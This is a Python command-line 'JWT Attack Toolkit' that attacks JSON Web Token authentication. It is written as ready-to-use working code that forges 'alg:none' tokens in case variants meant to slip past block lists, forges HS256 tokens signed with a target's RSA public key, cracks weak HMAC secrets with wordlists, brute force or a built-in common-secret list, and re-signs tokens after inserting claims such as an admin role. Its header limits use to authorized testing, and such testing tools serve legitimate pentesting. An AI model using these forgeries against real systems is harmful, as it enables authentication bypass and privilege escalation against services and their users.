#!/usr/bin/env python3
"""
================================================================================
                         JWT ATTACK TOOLKIT
================================================================================
Coded by: Mr Sabaz Ali Khan
Role:     Cyber Security Engineer

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣶⣦⡄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣀⣀⣀⡀⢀⠀⢹⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣷⣄⠨⣿⣿⣿⡌⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣷⣿⣿⣿⣿⣿⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣴⣾⣿⣮⣝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠉⠙⠻⢿⣿⣿⣿⣿⣿⣿⠟⣹⣿⡿⢿⣿⣿⣬⣶⣶⡶⠦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⣢⣙⣻⢿⣿⣿⣿⠎⢸⣿⠕⢹⣿⣿⡿⣛⣥⣀⣀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠉⠛⠿⡏⣿⡏⠿⢄⣜⣡⠞⠛⡽⣸⡿⣟⡋⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠾⠿⣿⠁⠀⡄⠀⠀⠰⠾⠿⠛⠓⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠠⢐⢉⢷⣀⠛⠠⠐⠐⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣠⣴⣶⣿⣧⣾⠡⠼⠎⢎⣋⡄⠆⠀⠱⡄⢉⠃⣦⡤⡀⠀⠀⠀⠀
⠀⠀⠐⠙⠻⢿⣿⣿⣿⣿⣿⣿⣄⡀⠀⢩⠀⢀⠠⠂⢀⡌⠀⣿⡇⠟⠀⠀⢄⠀
⠀⣴⣇⠀⡇⠀⠸⣿⣿⣿⣿⣽⣟⣲⡤⠀⣀⣠⣴⡾⠟⠀⠀⠟⠀⠀⠀⠀⡰⡀
⣼⣿⠋⢀⣇⢸⡄⢻⣟⠻⣿⣿⣿⣿⣿⣿⠿⡿⠟⢁⠀⠀⠀⠀⠀⢰⠀⣠⠀⠰
⢸⣿⡣⣜⣿⣼⣿⣄⠻⡄⡀⠉⠛⠿⠿⠛⣉⡤⠖⣡⣶⠁⠀⠀⠀⣾⣶⣿⠐⡀
⣾⡇⠈⠛⠛⠿⣿⣿⣦⠁⠘⢷⣶⣶⡶⠟⢋⣠⣾⡿⠃⠀⠀⠀⠰⠛⠉⠉⠀⠀

Description:
    A command-line toolkit for AUTHORIZED security testing of JSON Web
    Tokens (JWTs). Implements well-known JWT weaknesses so pentesters and
    developers can verify their own applications are not vulnerable to them.

    Attacks implemented:
      1. Decode / inspect a JWT (header, payload, signature)
      2. "alg: none" attack            - forge an unsigned token
      3. Algorithm confusion (RS256->HS256) - forge HMAC token using public key
      4. Weak HMAC secret cracking      - dictionary / brute-force attack
      5. Claim tampering               - re-sign a token after editing claims
      6. Expiry / "exp" claim checks   - detect missing or permissive expiry

LEGAL / ETHICAL NOTICE:
    Use this tool ONLY against systems and tokens you own or are explicitly
    authorized to test. Unauthorized use against third-party systems is
    illegal in most jurisdictions. The author (Mr Sabaz Ali Khan) and any
    distributor of this script accept no liability for misuse.
================================================================================
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
import time
import itertools

BANNER = r"""
==================================================================
                      JWT ATTACK TOOLKIT
            Coded by: Mr Sabaz Ali Khan (Cyber Security Engineer)
==================================================================
"""


# -----------------------------------------------------------------------
# Helpers: base64url encode/decode (JWT uses base64url, no padding)
# -----------------------------------------------------------------------
def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(data: str) -> bytes:
    padding = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)


def split_jwt(token: str):
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError("Not a valid JWT (expected 3 dot-separated parts).")
    return parts  # header, payload, signature (all base64url strings)


def decode_jwt(token: str):
    header_b64, payload_b64, sig_b64 = split_jwt(token)
    header = json.loads(b64url_decode(header_b64))
    payload = json.loads(b64url_decode(payload_b64))
    signature = b64url_decode(sig_b64) if sig_b64 else b""
    return header, payload, signature


# -----------------------------------------------------------------------
# 1. Inspect
# -----------------------------------------------------------------------
def cmd_decode(args):
    header, payload, signature = decode_jwt(args.token)
    print("\n[HEADER]")
    print(json.dumps(header, indent=2))
    print("\n[PAYLOAD]")
    print(json.dumps(payload, indent=2))
    print("\n[SIGNATURE] (hex)")
    print(signature.hex() if signature else "(none / empty)")

    # quick expiry sanity check
    exp = payload.get("exp")
    if exp is None:
        print("\n[!] WARNING: token has no 'exp' claim - it may never expire.")
    else:
        remaining = exp - time.time()
        if remaining < 0:
            print(f"\n[i] Token expired {abs(remaining):.0f} seconds ago.")
        else:
            print(f"\n[i] Token expires in {remaining:.0f} seconds.")


# -----------------------------------------------------------------------
# 2. alg:none attack
# -----------------------------------------------------------------------
def cmd_none_attack(args):
    header, payload, _ = decode_jwt(args.token)

    forged_tokens = []
    for alg_value in ("none", "None", "NONE", "nOnE"):
        new_header = dict(header)
        new_header["alg"] = alg_value
        new_header.pop("kid", None)
        header_b64 = b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
        payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        # signature is empty for 'none'
        forged = f"{header_b64}.{payload_b64}."
        forged_tokens.append((alg_value, forged))

    print("\n[*] Forged 'alg:none' tokens (try each against the target - some")
    print("    servers only blocklist the exact casing 'none'):\n")
    for alg_value, tok in forged_tokens:
        print(f"  alg=\"{alg_value}\":")
        print(f"  {tok}\n")


# -----------------------------------------------------------------------
# 3. Algorithm confusion: RS256 -> HS256
#    If a server verifies RS256 tokens using the RSA public key, but a
#    developer's verification code accepts HS256 too, an attacker who
#    knows the RSA PUBLIC key can sign a token with HS256 using the
#    public key (as a string) as the HMAC secret. The server then
#    "verifies" it with the same public key and it checks out.
# -----------------------------------------------------------------------
def cmd_alg_confusion(args):
    with open(args.pubkey, "rb") as f:
        public_key_pem = f.read()

    header, payload, _ = decode_jwt(args.token)
    new_header = dict(header)
    new_header["alg"] = "HS256"
    new_header.pop("kid", None)

    if args.edit_payload:
        try:
            edits = json.loads(args.edit_payload)
            payload.update(edits)
        except json.JSONDecodeError:
            print("[!] --edit-payload must be valid JSON, e.g. '{\"role\":\"admin\"}'")
            sys.exit(1)

    header_b64 = b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()

    # The RSA public key PEM bytes are used verbatim as the HMAC secret -
    # this is the core of the attack.
    signature = hmac.new(public_key_pem, signing_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(signature)

    forged = f"{header_b64}.{payload_b64}.{sig_b64}"
    print("\n[*] Forged HS256 token signed with RSA public key as HMAC secret:\n")
    print(forged)
    print("\n[i] This only succeeds if the target's verification library")
    print("    trusts the 'alg' header and does not pin the expected algorithm.")


# -----------------------------------------------------------------------
# 4. Weak secret cracking (HS256/384/512)
# -----------------------------------------------------------------------
HASH_ALGS = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}


def try_secret(signing_input: bytes, target_sig: bytes, secret: str, hashfn) -> bool:
    candidate = hmac.new(secret.encode(), signing_input, hashfn).digest()
    return hmac.compare_digest(candidate, target_sig)


def cmd_crack(args):
    header, payload, signature = decode_jwt(args.token)
    alg = header.get("alg", "HS256")
    if alg not in HASH_ALGS:
        print(f"[!] alg '{alg}' is not an HMAC algorithm; cannot dictionary-crack.")
        sys.exit(1)
    hashfn = HASH_ALGS[alg]

    header_b64, payload_b64, _ = split_jwt(args.token)
    signing_input = f"{header_b64}.{payload_b64}".encode()

    print(f"\n[*] Attempting to crack {alg} secret...")

    found = None
    tried = 0
    start = time.time()

    if args.wordlist:
        with open(args.wordlist, "r", errors="ignore") as f:
            for line in f:
                secret = line.strip("\n\r")
                if not secret:
                    continue
                tried += 1
                if try_secret(signing_input, signature, secret, hashfn):
                    found = secret
                    break
    elif args.bruteforce:
        chars = args.charset
        for length in range(args.min_len, args.max_len + 1):
            if found:
                break
            for combo in itertools.product(chars, repeat=length):
                secret = "".join(combo)
                tried += 1
                if try_secret(signing_input, signature, secret, hashfn):
                    found = secret
                    break
    else:
        # built-in list of extremely common JWT secrets
        common_secrets = [
            "secret", "123456", "password", "jwt_secret", "changeme",
            "your-256-bit-secret", "supersecret", "secretkey", "key",
            "admin", "test", "qwerty", "letmein", "dev", "development",
            "production", "mysecret", "jwtsecret", "apisecret",
        ]
        for secret in common_secrets:
            tried += 1
            if try_secret(signing_input, signature, secret, hashfn):
                found = secret
                break

    elapsed = time.time() - start
    print(f"[i] Tried {tried} candidate(s) in {elapsed:.2f}s")
    if found:
        print(f"\n[+] SECRET FOUND: '{found}'")
    else:
        print("\n[-] Secret not found with the given method/wordlist.")


# -----------------------------------------------------------------------
# 5. Claim tampering + re-sign (when secret is known)
# -----------------------------------------------------------------------
def cmd_forge(args):
    header, payload, _ = decode_jwt(args.token)
    alg = header.get("alg", "HS256")
    if alg not in HASH_ALGS:
        print(f"[!] alg '{alg}' is not an HMAC algorithm; this command signs HS* only.")
        sys.exit(1)
    hashfn = HASH_ALGS[alg]

    try:
        edits = json.loads(args.claims)
    except json.JSONDecodeError:
        print("[!] --claims must be valid JSON, e.g. '{\"role\":\"admin\",\"exp\":9999999999}'")
        sys.exit(1)
    payload.update(edits)

    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    signature = hmac.new(args.secret.encode(), signing_input, hashfn).digest()
    sig_b64 = b64url_encode(signature)

    forged = f"{header_b64}.{payload_b64}.{sig_b64}"
    print("\n[*] Forged token with tampered claims:\n")
    print(forged)


# -----------------------------------------------------------------------
# Argument parsing
# -----------------------------------------------------------------------
def build_parser():
    parser = argparse.ArgumentParser(
        description="JWT Attack Toolkit - coded by Mr Sabaz Ali Khan (Cyber Security Engineer). "
                     "For AUTHORIZED security testing only."
    )
    sub = parser.add_subparsers(dest="command", required=True)

    p_decode = sub.add_parser("decode", help="Decode and inspect a JWT")
    p_decode.add_argument("token", help="The JWT to decode")
    p_decode.set_defaults(func=cmd_decode)

    p_none = sub.add_parser("none-attack", help="Forge an 'alg:none' unsigned token")
    p_none.add_argument("token", help="A valid JWT from the target to use as a template")
    p_none.set_defaults(func=cmd_none_attack)

    p_confuse = sub.add_parser(
        "alg-confusion",
        help="Forge an HS256 token signed with the target's RSA public key (RS256->HS256 confusion)",
    )
    p_confuse.add_argument("token", help="A valid RS256 JWT from the target")
    p_confuse.add_argument("--pubkey", required=True, help="Path to the target's RSA public key (PEM)")
    p_confuse.add_argument(
        "--edit-payload",
        help="JSON object of claims to overwrite before signing, e.g. '{\"role\":\"admin\"}'",
    )
    p_confuse.set_defaults(func=cmd_alg_confusion)

    p_crack = sub.add_parser("crack", help="Crack a weak HMAC secret (HS256/384/512)")
    p_crack.add_argument("token", help="The JWT whose secret you want to recover")
    p_crack.add_argument("--wordlist", help="Path to a wordlist file")
    p_crack.add_argument("--bruteforce", action="store_true", help="Brute-force instead of using a wordlist")
    p_crack.add_argument("--charset", default="abcdefghijklmnopqrstuvwxyz0123456789", help="Charset for brute-force")
    p_crack.add_argument("--min-len", type=int, default=1, help="Minimum brute-force length")
    p_crack.add_argument("--max-len", type=int, default=4, help="Maximum brute-force length")
    p_crack.set_defaults(func=cmd_crack)

    p_forge = sub.add_parser("forge", help="Tamper claims and re-sign (requires known secret)")
    p_forge.add_argument("token", help="A valid JWT to use as a template")
    p_forge.add_argument("--secret", required=True, help="The known HMAC secret")
    p_forge.add_argument("--claims", required=True, help="JSON object of claims to overwrite, e.g. '{\"role\":\"admin\"}'")
    p_forge.set_defaults(func=cmd_forge)

    return parser


def main():
    print(BANNER)
    parser = build_parser()
    args = parser.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
